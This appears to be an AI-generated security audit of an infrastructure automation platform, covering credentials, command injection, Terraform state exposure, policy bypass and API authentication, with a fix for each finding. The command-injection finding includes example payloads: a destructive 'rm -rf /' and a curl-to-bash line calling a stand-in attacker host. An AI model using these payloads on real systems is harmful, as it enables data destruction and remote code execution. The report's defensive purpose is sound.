# Security Review: Infrastructure Automation Platform

**Review Date:** 2026-03-06
**Scope:** Full source code review of `infrastructure-automation-platform`
**Reviewer:** Automated Security Audit (Claude)

---

## Executive Summary

This security review covers the entire Infrastructure Automation Platform codebase, including Python services (`src/`), Terraform templates and modules (`terraform/`), OPA/Rego policies (`policies/`), Trigger.dev job definitions (`trigger-jobs/`), Docker Compose orchestration, Supabase migrations, and configuration files.

**18 findings** were identified across 8 focus areas:

| Severity | Count |
|----------|-------|
| CRITICAL | 3     |
| HIGH     | 6     |
| MEDIUM   | 7     |
| LOW      | 2     |

The most urgent issues are **command injection in the remediation engine**, **hardcoded credentials in Docker Compose**, and **a completely stubbed OPA policy check** that bypasses all compliance enforcement during Terraform applies.

---

## Table of Contents

1. [Hardcoded Cloud Credentials](#1-hardcoded-cloud-credentials)
2. [Command Injection Risks](#2-command-injection-risks)
3. [Terraform State Exposure](#3-terraform-state-exposure)
4. [Policy Bypass Risks in OPA/Rego](#4-policy-bypass-risks-in-oparego)
5. [Docker Privilege Escalation & Misconfiguration](#5-docker-privilege-escalation--misconfiguration)
6. [Authentication on API Endpoints](#6-authentication-on-api-endpoints)
7. [Infrastructure Topology Data Exposure](#7-infrastructure-topology-data-exposure)
8. [Dependency Vulnerabilities](#8-dependency-vulnerabilities)

---

## 1. Hardcoded Cloud Credentials

### Finding 1.1: Hardcoded Database Credentials in Docker Compose

- **Severity:** CRITICAL
- **File:** `docker-compose.yml`, lines 26, 54-56
- **Description:** Production-pattern Docker Compose file contains hardcoded PostgreSQL credentials. While Docker Compose files are often used for local development, this file defines production-like services (TimescaleDB, Grafana, OPA, Redis) and the credentials are reused across multiple services, creating a pattern that could propagate to production deployments.

**Code Evidence:**

```yaml
# Line 26
DATABASE_URL: postgresql://postgres:postgres@timescaledb:5432/iap

# Lines 54-56
POSTGRES_USER: postgres
POSTGRES_PASSWORD: postgres
POSTGRES_DB: iap
```

**Fix:**
- Replace all hardcoded credentials with environment variable references: `${POSTGRES_PASSWORD:?required}`
- Create a `docker-compose.override.yml` for local development with non-production defaults
- Add a `.env.docker` template file and document that credentials must be set before running
- Use Docker secrets for production-grade deployments

---

### Finding 1.2: Hardcoded Grafana Admin Credentials

- **Severity:** HIGH
- **File:** `docker-compose.yml`, lines 96-97
- **Description:** Grafana admin username and password are hardcoded as `admin/admin`. If this Docker Compose configuration is used in any staging or production-like environment, the monitoring dashboard is immediately compromisable.

**Code Evidence:**

```yaml
# Lines 96-97
GF_SECURITY_ADMIN_USER: admin
GF_SECURITY_ADMIN_PASSWORD: admin
```

**Fix:**
- Replace with environment variable references: `GF_SECURITY_ADMIN_PASSWORD: ${GRAFANA_ADMIN_PASSWORD:?required}`
- Enforce password change on first login: `GF_USERS_ALLOW_SIGN_UP: false`
- Integrate Grafana with the platform's SSO/OAuth provider

---

### Finding 1.3: Hardcoded Credentials in Digital Twin Simulation

- **Severity:** HIGH
- **File:** `src/simulation/digital_twin.py`, lines 204-208, 230-232
- **Description:** The digital twin environment generator hardcodes database and object storage credentials directly in generated Docker Compose YAML. These credentials are emitted as part of simulation topology output, which could be logged, stored in databases, or transmitted over the network.

**Code Evidence:**

```python
# Lines 204-208 (database container)
"POSTGRES_PASSWORD": "twin-test-only"

# Lines 230-232 (MinIO object storage)
"MINIO_ROOT_USER": "minioadmin"
"MINIO_ROOT_PASSWORD": "minioadmin"
```

**Fix:**
- Generate random credentials at simulation runtime using `secrets.token_urlsafe(32)`
- Pass credentials via environment variable injection rather than embedding in topology definitions
- If credentials must be in the topology output, mark the output as sensitive and ensure it is not logged or persisted in plain text

---

## 2. Command Injection Risks

### Finding 2.1: Shell Command Injection via Remediation Playbook Context

- **Severity:** CRITICAL
- **File:** `src/incident_response/remediation_engine.py`, lines 382-385
- **Description:** The remediation engine constructs shell commands by performing raw string replacement of user-controlled context values into command templates. There is no input sanitization, escaping, or allowlisting. An attacker who can influence the context dictionary (e.g., by manipulating incident metadata, service names, or alert payloads) can inject arbitrary shell commands that will be executed on the infrastructure.

**Code Evidence:**

```python
# Lines 382-385
command = step.command
for key, value in context.items():
    command = command.replace(f"{{{key}}}", str(value))
```

The playbook definitions (lines 86-227) contain dangerous command templates such as:

```python
"systemctl restart {service_name}"
"find /var/log/{service_name} -name '*.log' -mtime +7 -delete"
"find /tmp -type f -mtime +7 -delete"
```

If `service_name` is set to `nginx; rm -rf /` or `nginx$(curl attacker.com/shell.sh|bash)`, the injected commands execute with the privileges of the remediation service.

**Fix:**
- Use `shlex.quote()` on ALL context values before substitution:
  ```python
  import shlex
  for key, value in context.items():
      command = command.replace(f"{{{key}}}", shlex.quote(str(value)))
  ```
- Implement an allowlist for context values (e.g., service names must match `^[a-zA-Z0-9_-]+$`)
- Use `subprocess.run()` with argument lists instead of shell strings where possible
- Add input validation at the point where context is populated (incident ingestion, alert correlation)
- Consider replacing shell command execution with a structured action framework (API calls, SDKs) that does not involve shell interpretation

---

### Finding 2.2: Untrusted Terraform Configuration Written to Disk and Executed

- **Severity:** HIGH
- **File:** `trigger-jobs/terraform_apply.ts`, lines 83, 97, 128, 183
- **Description:** The Terraform apply job receives a `terraform_config` object from the event payload and writes it directly to disk as a JSON file, then executes `terraform init`, `terraform plan`, and `terraform apply` against it. While Terraform itself is sandboxed to some degree, a malicious or compromised event payload could include Terraform configurations that execute arbitrary `local-exec` or `external` provisioners, exfiltrate data via `http` data sources, or provision unauthorized resources.

**Code Evidence:**

```typescript
// Line 83 - Untrusted config written to disk
fs.writeFileSync(tfConfigPath, JSON.stringify(event.terraform_config, null, 2));

// Lines 97, 128, 183 - Terraform executed on untrusted config
cp.spawn("terraform", ["init", "-no-color", "-input=false"], { cwd: workDir });
cp.spawn("terraform", ["plan", "-no-color", "-input=false", "-out=tfplan"], { cwd: workDir });
cp.spawn("terraform", ["apply", "-no-color", "-input=false", "tfplan"], { cwd: workDir });
```

**Fix:**
- Never accept raw Terraform HCL/JSON from untrusted event payloads
- Use a template-based approach: accept only parameter values and inject them into pre-approved Terraform templates stored server-side
- Run Terraform in a restricted sandbox (e.g., container with no network egress except to cloud APIs)
- Disable dangerous Terraform features via `terraform.rc`: block `local-exec`, `external`, and `http` provisioners/data sources
- Validate the Terraform configuration against OPA policies BEFORE writing to disk (see Finding 4.1)

---

## 3. Terraform State Exposure

### Finding 3.1: Full Terraform State Returned in Job Output

- **Severity:** HIGH
- **File:** `trigger-jobs/terraform_apply.ts`, lines 280-281
- **Description:** The Terraform apply job reads the full `terraform.tfstate` file and returns it as part of the job result payload. Terraform state files routinely contain sensitive data including database passwords, API keys, private IP addresses, and resource ARNs. Returning state in job output means it is stored in the Trigger.dev job history, potentially logged, and accessible to anyone with job read permissions.

**Code Evidence:**

```typescript
// Lines 280-281
terraform_state: finalState,  // Full state file contents in job result
```

**Fix:**
- Never return full Terraform state in job output
- Store state exclusively in a remote backend (S3 + DynamoDB locking) with server-side encryption
- If state data is needed for downstream processing, extract only the specific output values required
- Enable state encryption at rest in the remote backend
- Restrict state file access via IAM policies to only the Terraform execution role

---

### Finding 3.2: Terraform State Path Exposed in Provisioning Results

- **Severity:** MEDIUM
- **File:** `src/provisioning/workflow.py`, line 372
- **Description:** The provisioning workflow returns the S3 state file path in its result object. This reveals the state storage structure (bucket name, org/project hierarchy) to any consumer of the provisioning API, which could enable targeted attacks on the state backend.

**Code Evidence:**

```python
# Line 372
"state_path": f"s3://tf-state/{request.org_id}/{request.project_name}/terraform.tfstate"
```

**Fix:**
- Remove the state path from the provisioning result
- If state location must be communicated, use an opaque reference ID that maps to the actual path server-side
- Ensure the S3 bucket for Terraform state has bucket policies restricting access to the Terraform execution role only

---

### Finding 3.3: Terraform State Stored as JSONB in Database

- **Severity:** MEDIUM
- **File:** `supabase/migrations/001_initial_schema.sql`, line 96
- **Description:** The `provisioning_requests` table includes a `terraform_state_snapshot jsonb` column. Storing Terraform state in a PostgreSQL column means secrets embedded in state are persisted in the application database, subject to SQL injection risk, included in database backups, and accessible to any service or user with read access to this table.

**Code Evidence:**

```sql
-- Line 96
terraform_state_snapshot jsonb,
```

**Fix:**
- Remove the `terraform_state_snapshot` column from the application database
- Store Terraform state exclusively in a purpose-built remote backend (S3 with encryption, versioning, and access logging)
- If a state reference is needed in the application database, store only the remote backend key/path (and even that should be an opaque reference)

---

## 4. Policy Bypass Risks in OPA/Rego

### Finding 4.1: OPA Policy Check Completely Stubbed in Terraform Apply Job

- **Severity:** CRITICAL
- **File:** `trigger-jobs/terraform_apply.ts`, lines 162-165
- **Description:** The Terraform apply job contains a policy evaluation step that is entirely stubbed out. It always returns `approved: true` with an empty violations array. This means ALL Terraform applies bypass policy enforcement regardless of the OPA policies defined in `policies/`. The mandatory tags, encryption requirements, public storage restrictions, and instance size limits are never actually evaluated against real infrastructure changes.

**Code Evidence:**

```typescript
// Lines 162-165
// TODO: Implement actual OPA policy evaluation
return { approved: true, violations: [] };
```

**Fix:**
- Implement the actual OPA REST API call:
  ```typescript
  const response = await fetch(`${process.env.OPA_URL}/v1/data/infrastructure/policy`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ input: terraformPlan }),
  });
  const result = await response.json();
  return { approved: result.result.allow, violations: result.result.violations };
  ```
- Block `terraform apply` if any policy violation is detected
- Log all policy evaluation results for audit purposes
- Add integration tests that verify the OPA policy gate cannot be bypassed

---

### Finding 4.2: Python Policy Engine Is a Simulation, Not Actual OPA Integration

- **Severity:** MEDIUM
- **File:** `src/provisioning/policy_engine.py` (entire file)
- **Description:** The Python-based policy engine in `src/provisioning/policy_engine.py` implements policy evaluation logic entirely in Python. It does not call the OPA REST API or evaluate Rego policies. While the OPA policies in `policies/` are well-structured, they are effectively dead code since neither the Python policy engine nor the Terraform apply job evaluates them.

**Fix:**
- Replace the Python policy simulation with actual OPA REST API calls to `http://opa-server:8181/v1/data/`
- Ensure the Docker Compose OPA service is loaded with the policies from the `policies/` directory
- Add health checks that verify OPA is running and policies are loaded before allowing provisioning operations

---

## 5. Docker Privilege Escalation & Misconfiguration

### Finding 5.1: Redis Running Without Authentication

- **Severity:** HIGH
- **File:** `docker-compose.yml`, line 80
- **Description:** The Redis service is started without any authentication mechanism. Any service or attacker with network access to the Redis port can read and write arbitrary data, execute Lua scripts, or use Redis as a pivot point for further attacks. Redis without authentication is a well-known attack vector that has been exploited in numerous real-world breaches.

**Code Evidence:**

```yaml
# Line 80
command: redis-server --appendonly yes
# No --requirepass flag
```

**Fix:**
- Add authentication: `command: redis-server --appendonly yes --requirepass ${REDIS_PASSWORD:?required}`
- Configure all Redis clients to use the password
- Bind Redis to internal network only (already partially addressed by Docker networking, but should be explicit)
- Consider enabling Redis TLS for encrypted transport

---

### Finding 5.2: Service Ports Exposed to All Interfaces

- **Severity:** MEDIUM
- **File:** `docker-compose.yml`, lines 29-30, 59, 77, 91
- **Description:** Multiple services bind their ports to `0.0.0.0` (all interfaces), making them accessible from outside the Docker host. This includes the API server (8000), PostgreSQL/TimescaleDB (5432), Redis (6379), and OPA (8181).

**Code Evidence:**

```yaml
ports:
  - "8000:8000"   # API server - accessible from any interface
  - "5432:5432"   # TimescaleDB - accessible from any interface
  - "6379:6379"   # Redis - accessible from any interface
  - "8181:8181"   # OPA - accessible from any interface
```

**Fix:**
- Bind ports to localhost for local development: `"127.0.0.1:5432:5432"`
- Remove port mappings for services that only need Docker-internal communication (Redis, OPA, TimescaleDB)
- Use Docker networks to isolate service-to-service communication
- For production, use a reverse proxy and do not expose backend service ports

---

## 6. Authentication on API Endpoints

### Finding 6.1: No Authentication on Internal API Calls from Trigger Jobs

- **Severity:** HIGH
- **File:** `trigger-jobs/incident_remediation.ts`, lines 61, 271-288, 306-314, 336-424
- **Description:** All HTTP requests from the incident remediation Trigger.dev job to the internal API (`http://api:3000`) are made without any authentication headers. This includes requests that fetch runbooks, update incident status, execute remediation actions (restart services, clear caches, unlock databases, drain queues, reroute traffic, scale resources), and perform rollback operations. If the API is accessible from any other service or network segment, these endpoints can be called without authorization.

**Code Evidence:**

```typescript
// Line 61 - Fetching runbook with no auth
const response = await fetch(`http://api:3000/runbooks/${event.runbook_id}`);

// Lines 271-288 - Updating incident status with no auth
const response = await fetch(`http://api:3000/incidents/${event.incident_id}`, {
  method: "PATCH",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ status: "resolved", ... }),
});

// Lines 336-341 - Restarting services with no auth
const response = await fetch("http://api:3000/actions/restart-service", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ service_name: serviceName }),
});
```

The same pattern repeats for all action endpoints: `/actions/clear-cache`, `/actions/rotate-logs`, `/actions/reroute-traffic`, `/actions/scale-resources`, `/actions/unlock-database`, `/actions/drain-queue`, `/actions/rollback`, and `/verification/check-health`.

**Fix:**
- Add service-to-service authentication using a shared secret or mTLS:
  ```typescript
  headers: {
    "Content-Type": "application/json",
    "Authorization": `Bearer ${process.env.INTERNAL_API_TOKEN}`,
  }
  ```
- Implement API middleware that validates the service token on all internal endpoints
- Use network policies (Kubernetes NetworkPolicy or Docker network isolation) as defense-in-depth
- Implement RBAC on the API to restrict which service identities can call which endpoints (e.g., remediation jobs should not be able to call provisioning endpoints)

---

### Finding 6.2: No Authentication on Terraform Apply Job API Calls

- **Severity:** HIGH
- **File:** `trigger-jobs/terraform_apply.ts` (multiple lines)
- **Description:** Similar to Finding 6.1, the Terraform apply job makes unauthenticated API calls for status updates and resource registration. The same risks apply.

**Fix:** Same as Finding 6.1 -- implement service-to-service authentication on all internal API calls.

---

## 7. Infrastructure Topology Data Exposure

### Finding 7.1: VPC Network ACL Allows SSH from 0.0.0.0/0

- **Severity:** MEDIUM
- **File:** `terraform/templates/vpc_network.tf`, lines 506-513
- **Description:** The public subnet Network ACL ingress rules allow SSH (TCP port 22) from any IP address (`0.0.0.0/0`). This exposes any instances in the public subnet to SSH brute-force attacks and exploitation of SSH vulnerabilities from the entire internet.

**Code Evidence:**

```hcl
# Lines 506-513
ingress {
  protocol   = "tcp"
  rule_no    = 200
  action     = "allow"
  cidr_block = "0.0.0.0/0"
  from_port  = 22
  to_port    = 22
}
```

**Fix:**
- Restrict SSH access to a known bastion host CIDR or VPN range:
  ```hcl
  cidr_block = var.admin_cidr_block  # e.g., "10.0.0.0/8" or corporate VPN CIDR
  ```
- Use AWS Systems Manager Session Manager or EC2 Instance Connect to eliminate the need for direct SSH access
- If SSH must be available, use security groups with time-limited IP allowlisting rather than NACLs

---

### Finding 7.2: Kubernetes ClusterRole with Wildcard Permissions

- **Severity:** MEDIUM
- **File:** `terraform/templates/kubernetes_namespace.tf`, lines 440-451, 478-489
- **Description:** The `namespace_admin` ClusterRole grants wildcard access (`["*"]`) to all API groups, all resources, and all verbs. This effectively makes any principal bound to this role a cluster admin within the namespace, with the ability to read secrets, create privileged pods, modify RBAC, and escalate privileges. The `namespace_readonly` role also uses `api_groups = ["*"]` and `resources = ["*"]` for read access, which includes reading Secrets.

**Code Evidence:**

```hcl
# Lines 446-451 (namespace_admin)
rule {
  api_groups = ["*"]
  resources  = ["*"]
  verbs      = ["*"]
}

# Lines 484-489 (namespace_readonly)
rule {
  api_groups = ["*"]
  resources  = ["*"]
  verbs      = ["get", "list", "watch"]
}
```

**Fix:**
- Replace wildcards with explicit API groups and resources:
  ```hcl
  rule {
    api_groups = ["", "apps", "batch"]
    resources  = ["deployments", "services", "configmaps", "pods", "jobs"]
    verbs      = ["get", "list", "watch", "create", "update", "patch", "delete"]
  }
  ```
- Exclude `secrets` from the readonly role to prevent credential exposure
- Use namespace-scoped Roles instead of ClusterRoles where possible
- Add `PodSecurityPolicy` or `PodSecurity` admission to prevent privilege escalation via pod creation

---

### Finding 7.3: Raw Exception Messages Exposed in Failure Notifications

- **Severity:** LOW
- **File:** `src/provisioning/workflow.py`, line 235
- **Description:** When a provisioning workflow fails, the raw Python exception message is stored in `result.failure_reason` and potentially sent in notifications. Exception messages can contain internal details such as database connection strings, file paths, API endpoint URLs, stack traces, and credential fragments.

**Code Evidence:**

```python
# Line 235
result.failure_reason = str(e)
```

**Fix:**
- Map exceptions to user-friendly error codes and messages
- Log the full exception details server-side at ERROR level
- Return only a sanitized error message and a correlation ID for support investigation:
  ```python
  import uuid
  error_id = str(uuid.uuid4())
  logger.error(f"Provisioning failed [{error_id}]", exc_info=True)
  result.failure_reason = f"Provisioning failed. Reference: {error_id}"
  ```

---

### Finding 7.4: Incomplete Row-Level Security on Database Tables

- **Severity:** MEDIUM
- **File:** `supabase/migrations/001_initial_schema.sql`, lines 516-538
- **Description:** Row-Level Security (RLS) is enabled on only a subset of tables: `environments`, `resources`, `provisioning_requests`, `incidents`, `runbook_executions`. Several security-sensitive tables do NOT have RLS enabled: `policy_definitions`, `policy_evaluations`, `audit_log`, `runbooks`, `simulation_runs`, `canary_deployments`, `metrics`, `anomaly_baselines`, `compliance_scans`. Without RLS, any authenticated Supabase user can read and potentially modify data in these tables.

**Fix:**
- Enable RLS on ALL tables:
  ```sql
  ALTER TABLE policy_definitions ENABLE ROW LEVEL SECURITY;
  ALTER TABLE policy_evaluations ENABLE ROW LEVEL SECURITY;
  ALTER TABLE audit_log ENABLE ROW LEVEL SECURITY;
  ALTER TABLE runbooks ENABLE ROW LEVEL SECURITY;
  ALTER TABLE simulation_runs ENABLE ROW LEVEL SECURITY;
  ALTER TABLE canary_deployments ENABLE ROW LEVEL SECURITY;
  ALTER TABLE metrics ENABLE ROW LEVEL SECURITY;
  ALTER TABLE anomaly_baselines ENABLE ROW LEVEL SECURITY;
  ALTER TABLE compliance_scans ENABLE ROW LEVEL SECURITY;
  ```
- Define appropriate RLS policies based on `organization_id` and user roles
- The `audit_log` table should be append-only with no update/delete policies for non-admin roles

---

### Finding 7.5: S3 Backend Bucket Name Derived from Unsanitized User Input

- **Severity:** LOW
- **File:** `src/provisioning/template_generator.py`, line 257
- **Description:** The Terraform S3 backend bucket name is constructed using a team name parameter without validation. While S3 bucket names have strict naming rules that would cause Terraform to fail on invalid input, a carefully crafted team name could target a different organization's state bucket or cause unexpected behavior.

**Code Evidence:**

```python
# Line 257
bucket = "tfstate-{team}"
```

**Fix:**
- Validate and sanitize the team name against S3 bucket naming rules: `^[a-z0-9][a-z0-9.-]{1,61}[a-z0-9]$`
- Use an organization-scoped prefix and a hash of the team name to prevent cross-tenant bucket targeting:
  ```python
  import hashlib
  team_hash = hashlib.sha256(f"{org_id}:{team}".encode()).hexdigest()[:12]
  bucket = f"tfstate-{org_id}-{team_hash}"
  ```

---

## 8. Dependency Vulnerabilities

### Finding 8.1: Minimum-Only Version Pinning in Requirements

- **Severity:** MEDIUM
- **File:** `requirements.txt` (entire file)
- **Description:** All Python dependencies use minimum version constraints only (`>=`) with no upper bounds. This means that `pip install` will always install the latest available version, which could introduce breaking changes or newly discovered vulnerabilities. There is no lock file (`requirements.lock` or `pip-compile` output) to ensure reproducible builds.

**Code Evidence:**

```
fastapi>=0.115.0
uvicorn[standard]>=0.30.0
pydantic>=2.10.0
sqlalchemy>=2.0.36
boto3>=1.34.3
# ... all 35+ dependencies use >= only
```

**Fix:**
- Generate a lock file using `pip-compile` (from `pip-tools`) or use `poetry.lock`/`uv.lock`:
  ```bash
  pip-compile requirements.txt --output-file requirements.lock
  ```
- Pin exact versions in the lock file for production deployments
- Set up automated dependency scanning (Dependabot, Snyk, or `pip-audit`) to detect known CVEs
- Run `pip-audit` in CI/CD to block deployments with known vulnerabilities
- Consider upper-bound constraints for critical dependencies: `fastapi>=0.115.0,<1.0.0`

---

## Summary of Recommendations

### Immediate Actions (CRITICAL)

1. **Fix command injection in `remediation_engine.py`** -- Apply `shlex.quote()` to all context values and implement input validation (Finding 2.1)
2. **Implement the OPA policy gate in `terraform_apply.ts`** -- Replace the stubbed `return { approved: true }` with actual OPA evaluation (Finding 4.1)
3. **Remove hardcoded credentials from `docker-compose.yml`** -- Use environment variable references with required flags (Finding 1.1)

### Short-Term Actions (HIGH)

4. Add service-to-service authentication on all internal API calls (Findings 6.1, 6.2)
5. Remove full Terraform state from job output (Finding 3.1)
6. Add Redis authentication (Finding 5.1)
7. Replace hardcoded credentials in `digital_twin.py` with runtime-generated secrets (Finding 1.3)
8. Remove hardcoded Grafana credentials (Finding 1.2)
9. Validate and sandbox Terraform configurations before execution (Finding 2.2)

### Medium-Term Actions (MEDIUM)

10. Enable RLS on all Supabase database tables (Finding 7.4)
11. Restrict Kubernetes RBAC roles to explicit resources (Finding 7.2)
12. Bind Docker service ports to localhost only (Finding 5.2)
13. Restrict VPC NACL SSH access to known CIDRs (Finding 7.1)
14. Remove Terraform state from application database (Finding 3.3)
15. Replace Python policy simulation with real OPA integration (Finding 4.2)
16. Implement dependency lock files and automated vulnerability scanning (Finding 8.1)
17. Remove state path from provisioning API response (Finding 3.2)

### Hardening Actions (LOW)

18. Sanitize exception messages before exposing in failure notifications (Finding 7.3)
19. Validate team names before constructing S3 bucket names (Finding 7.5)

---

## Appendix: Files Reviewed

| File | Type | Findings |
|------|------|----------|
| `docker-compose.yml` | Docker Compose | 1.1, 1.2, 5.1, 5.2 |
| `src/incident_response/remediation_engine.py` | Python | 2.1 |
| `trigger-jobs/terraform_apply.ts` | TypeScript | 2.2, 3.1, 4.1, 6.2 |
| `trigger-jobs/incident_remediation.ts` | TypeScript | 6.1 |
| `src/simulation/digital_twin.py` | Python | 1.3 |
| `src/provisioning/workflow.py` | Python | 3.2, 7.3 |
| `src/provisioning/policy_engine.py` | Python | 4.2 |
| `src/provisioning/template_generator.py` | Python | 7.5 |
| `supabase/migrations/001_initial_schema.sql` | SQL | 3.3, 7.4 |
| `terraform/templates/vpc_network.tf` | Terraform HCL | 7.1 |
| `terraform/templates/kubernetes_namespace.tf` | Terraform HCL | 7.2 |
| `requirements.txt` | Python deps | 8.1 |
| `.env.example` | Configuration | Reviewed, no finding (correctly uses placeholders) |
| `.gitignore` | Git config | Reviewed, no finding (correctly excludes secrets) |
| `vercel.json` | Deployment config | Reviewed, no finding (good security headers) |
| `policies/*.rego` | OPA/Rego | Reviewed, no finding in Rego logic (policies are well-structured but not enforced) |
| `terraform/templates/compute_instance.tf` | Terraform HCL | Reviewed (egress 0.0.0.0/0 is common pattern) |
| `terraform/templates/rds_instance.tf` | Terraform HCL | Reviewed, no finding (password marked sensitive) |
| `terraform/modules/tagging/main.tf` | Terraform HCL | Reviewed, no finding |
| `src/incident_response/alert_correlator.py` | Python | Reviewed, no finding |
| `src/incident_response/incident_classifier.py` | Python | Reviewed, no finding |
| `src/observability/compliance_scanner.py` | Python | Reviewed, no finding |
| `src/detection/anomaly_detector.py` | Python | Reviewed, no finding |
| `src/provisioning/resource_registry.py` | Python | Reviewed, no finding |
| `src/simulation/progressive_rollout.py` | Python | Reviewed, no finding |
| `src/simulation/synthetic_workload.py` | Python | Reviewed, no finding |
| `demo/run_simulation.py` | Python | Reviewed, no finding |
| `Makefile` | Build system | Reviewed, no finding |
| `policies/test/mandatory_tags_test.rego` | Rego test | Reviewed, no finding |
